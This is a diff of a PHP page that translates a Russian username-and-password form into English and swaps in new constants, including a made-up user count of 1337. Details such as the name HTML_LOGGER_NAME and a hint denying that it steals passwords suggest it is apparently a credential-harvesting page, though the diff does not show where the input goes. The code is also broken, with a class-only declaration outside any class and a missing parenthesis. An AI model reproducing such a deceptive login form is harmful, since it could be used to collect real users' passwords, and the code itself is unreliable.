@@ -29,9 +29,9 @@ if (MUSIC) {
 	define("music_tag",'');
 	private static $MUSIC_LIST = array();
 }
-const HTML_COPYRIGHT = '© Родители.';
-const HTML_LAST_UPDATE = 'никогда';
-const HOW_MANY_USERS = 333;
+const HTML_COPYRIGHT = '© Parents.';
+const HTML_LAST_UPDATE = 'never';
+const HOW_MANY_USERS = 1337;
 
 // On start
 date_default_timezone_set('Europe/Moscow');
@@ -41,24 +41,24 @@ const SCRIPT_PATH = basename(__FILE__); // Change this
 define("info_page",''
 .'<div class="adaptis-under">'.PHP_EOL
 .'				<img alt="" src="success.gif" class="adaptis">'.PHP_EOL
-.'				<div class="adaptis-1">Прочитайте внимательно!</div>'.PHP_EOL
-.'				<div class="adaptis-2">Если ваша почта не будет актуальной,<br>мы отклоним вашу заявку.</div>'.PHP_EOL
+.'				<div class="adaptis-1">Read carefully!</div>'.PHP_EOL
+.'				<div class="adaptis-2">If your email is not up to date,<br>we will reject your application.</div>'.PHP_EOL
 .'				<form action="'.SCRIPT_PATH.'" method="post">'.PHP_EOL
 .'					<input name="regform" value="false" type="hidden">'.PHP_EOL
-.'					<input name="" class="button-windalike-okey" type="submit" value="Жду письма">'.PHP_EOL
+.'					<input name="" class="button-windalike-okey" type="submit" value="Waiting for the mail">'.PHP_EOL
 .'				</form>'.PHP_EOL
 .'			</div>'.PHP_EOL);
 define("only_ask",''
-// .'			<div class="tipinfo"><span class="hintlabel">Подсказка:</span>&nbsp;Это не страница для кражи паролей или чего-то ещё подобного. Однако, все данные введённые здесь передаются по HTTP. Вводите данные только при малой активности трафика доступа к этой странице! Для этого я поместил счётчик внизу страницы.</div>'.PHP_EOL
+// .'			<div class="tipinfo"><span class="hintlabel">Hint:</span>&nbsp;This is not a page for stealing passwords or anything else like that. However, all data entered here is transmitted over HTTP. Enter data only when there is little traffic activity accessing this page! To do this, I placed a counter at the bottom of the page.</div>'.PHP_EOL
 .'			<form action="'.SCRIPT_PATH.'" method="POST">'.PHP_EOL
 .'			<input type="hidden" name="regform" value="true">'.PHP_EOL
 .'			<div class="labelinput">'.PHP_EOL
-.'			Имя пользователя:&nbsp;<input name="username" class="text-windalike" type="text" value="">'.PHP_EOL
+.'			User name:&nbsp;<input name="username" class="text-windalike" type="text" value="">'.PHP_EOL
 .'			</div>'.PHP_EOL
 .'			<div class="labelinput">'.PHP_EOL
-.'			Пароль:&nbsp;<input name="password" class="text-windalike" type="password" value="">'.PHP_EOL
+.'			Password:&nbsp;<input name="password" class="text-windalike" type="password" value="">'.PHP_EOL
 .'			</div>'.PHP_EOL
-.'			<input name="b-login" class="button-windalike" type="submit" value="Отправить заявку">'.PHP_EOL
+.'			<input name="b-login" class="button-windalike" type="submit" value="Send request">'.PHP_EOL
 .'			</form>'.PHP_EOL);
 define("howmanyonline",'<img alt="" src="loading.gif" style="vertical-align:middle;border:0;" border="0">');
 
@@ -181,7 +181,7 @@ if ($_POST['regform'] == "true") {
 		<div class="windows-form">
 			<div class="title">
 			<img class="in-title" alt="" src="logotype.gif"><br>
-			Добро пожаловать в <? decho(HTML_LOGGER_NAME); ?>!
+			Welcome to <?php decho(HTML_LOGGER_NAME); ?>!
 			</div>
 <?php
 
@@ -193,11 +193,11 @@ if ($will_say != "") {
 
 ?>
 			<div class="footer">
-			<? echo HTML_COPYRIGHT; ?><br>
+			<?php echo HTML_COPYRIGHT; ?><br>
 			<br>
-			Последнее обновление: <? decho(HTML_LAST_UPDATE); ?><br>
-			Всего пользователей: <? decho(HOW_MANY_USERS ?><br>
-			Онлайн пользователей: <? decho(howmanyonline,false); ?>
+			Last update: <?php decho(HTML_LAST_UPDATE); ?><br>
+			Total users: <?php decho(HOW_MANY_USERS ?><br>
+			Online users: <?php decho(howmanyonline,false); ?>
 			</div>
 		</div>
 	</div>
